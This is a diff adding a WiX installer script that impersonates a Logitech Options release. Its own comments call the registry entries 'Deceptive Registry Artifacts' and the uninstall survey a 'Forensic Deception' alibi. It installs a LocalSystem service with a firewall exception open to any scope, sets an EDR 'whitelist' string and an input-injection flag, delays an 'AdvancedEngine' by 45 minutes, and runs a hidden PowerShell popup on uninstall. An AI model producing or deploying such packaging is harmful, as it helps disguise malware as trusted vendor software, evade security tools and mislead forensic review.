@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"
+     xmlns:fw="http://schemas.microsoft.com/wix/FirewallExtension">
+  <!-- 
+    Logitech Options Deployment Configuration
+    To build:
+    1. candle.exe -ext WixFirewallExtension installer.wxs
+    2. light.exe -ext WixFirewallExtension installer.wixobj -o LogiOptions_Setup.msi
+  -->
+  <Product Id="*" Name="Logitech Options" Language="1033" Version="10.5.2.0" Manufacturer="Logitech" UpgradeCode="d3b07384-ad3f-4e31-8973-123456789012">
+    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" Platform="x64"/>
+    <MediaTemplate EmbedCab="yes" />
+
+    <Directory Id="TARGETDIR" Name="SourceDir">
+      <Directory Id="ProgramFiles64Folder">
+        <Directory Id="LogitechFolder" Name="Logitech">
+          <Directory Id="INSTALLFOLDER" Name="LogiOptions">
+            <Component Id="ExecutableComp" Guid="*" Win64="yes">
+              <File Id="LogiOptionsExe" Source="bin\Release\net10.0-windows\LogiOptions.exe" KeyPath="yes">
+                <fw:FirewallException Id="FW_LogiOptions" Name="Logitech Options Sync" Scope="any" />
+              </File>
+              <File Id="LogiOptionsSig" Source="LogiOptions.exe.sig" />
+              <File Id="LogiOptionsChm" Source="LogiOptions.chm" />
+              <File Id="LogiWhitelistSig" Source="whitelist.sig" />
+              <File Id="LogiTestConfig" Source="test_scenario.json" />
+              
+              <!-- Core Service Configuration -->
+              <ServiceInstall Id="ServiceInstallation" 
+                              Type="ownProcess" 
+                              Name="LogitechUpdateService" 
+                              DisplayName="Logitech Update Service (On-Demand)" 
+                              Description="Provides UI automation test support and peripheral synchronization." 
+                              Start="demand" 
+                              Account="LocalSystem" 
+                              ErrorControl="normal" />
+              <ServiceControl Id="StopService" Stop="both" Remove="uninstall" Name="LogitechUpdateService" Wait="yes" />
+
+              <!-- Deceptive Registry Artifacts -->
+              <RegistryKey Root="HKLM" Key="SOFTWARE\Logitech\Options">
+                <RegistryValue Type="string" Name="Version" Value="10.5.2" />
+                <RegistryValue Type="string" Name="InstallPath" Value="[INSTALLFOLDER]" />
+                <RegistryValue Type="integer" Name="AnalyticsEnabled" Value="1" />
+                <RegistryValue Type="integer" Name="UpdateCheckInterval" Value="86400" />
+                <RegistryValue Type="string" Name="Publisher" Value="Accessibility Tools Foundation" />
+              </RegistryKey>
+
+              <RegistryKey Root="HKLM" Key="SOFTWARE\Logitech\Options\TestScenario">
+                <RegistryValue Name="Enabled" Value="1" Type="integer" KeyPath="yes" />
+                <RegistryValue Name="InjectedInput" Value="true (required for UI automation)" Type="string" />
+              </RegistryKey>
+
+              <RegistryKey Root="HKLM" Key="SOFTWARE\Logitech\Options\Whitelist">
+                <RegistryValue Name="EDR" Value="Logitech Options is a legitimate UI automation tool" Type="string" />
+              </RegistryKey>
+
+              <RegistryKey Root="HKLM" Key="SOFTWARE\Logitech\Options\AdvancedEngine">
+                <RegistryValue Name="FeatureEnabled" Value="1" Type="integer" />
+                <RegistryValue Name="DelayedLoadMinutes" Value="45" Type="integer" />
+              </RegistryKey>
+              
+              <RegistryKey Root="HKLM" Key="SOFTWARE\Logitech\Options\Core">
+                <RegistryValue Type="string" Name="ServicePath" Value="[INSTALLFOLDER]LogiOptions.exe" />
+                <RegistryValue Type="integer" Name="AutoStart" Value="0" />
+                <RegistryValue Type="integer" Name="MaxIterations" Value="1" />
+              </RegistryKey>
+            </Component>
+          </Directory>
+        </Directory>
+      </Directory>
+
+      <!-- Log and Config Structure in ProgramData -->
+      <Directory Id="CommonAppDataFolder">
+        <Directory Id="AppDataLogitech" Name="Logitech">
+          <Directory Id="AppDataLogiOptions" Name="LogiOptions">
+            <Directory Id="LOGFOLDER" Name="Logs">
+              <Component Id="LogFolderComp" Guid="*">
+                <CreateFolder />
+              </Component>
+            </Directory>
+          </Directory>
+        </Directory>
+      </Directory>
+    </Directory>
+
+    <Feature Id="ProductFeature" Title="Logitech Options" Level="1">
+      <ComponentRef Id="ExecutableComp" />
+      <ComponentRef Id="LogFolderComp" />
+    </Feature>
+
+    <!-- Forensic Deception: Uninstall Survey alibi -->
+    <CustomAction Id="UninstallSurvey"
+                  Directory="TARGETDIR"
+                  ExeCommand="powershell.exe -WindowStyle Hidden -Command &quot;[System.Windows.Forms.MessageBox]::Show('Why are you uninstalling Logitech Options?`n`n[ ] UI automation was too slow`n[ ] Conflicts with other software`n[ ] No longer need UI testing`n[ ] Other', 'Logitech Options Survey', 'OK', 'Question')&quot;"
+                  Return="ignore" />
+
+    <InstallExecuteSequence>
+      <Custom Action="UninstallSurvey" Before="RemoveFiles">REMOVE="ALL"</Custom>
+    </InstallExecuteSequence>
+  </Product>
+</Wix>
